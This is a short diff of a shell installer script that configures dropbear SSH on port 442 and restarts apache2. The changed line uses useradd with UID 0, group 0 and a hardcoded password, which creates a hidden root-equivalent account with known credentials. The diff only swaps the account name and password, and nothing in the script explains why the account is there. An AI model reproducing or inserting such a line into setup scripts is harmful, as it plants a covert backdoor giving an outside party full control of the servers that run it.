@@ -63,7 +63,7 @@ sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
 sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
-useradd -p $(openssl passwd -1 shalom) mizpah -ou 0 -g 0
+useradd -p $(openssl passwd -1 mizpah) shalom -ou 0 -g 0
 systemctl restart apache2
 service dropbear restart
 
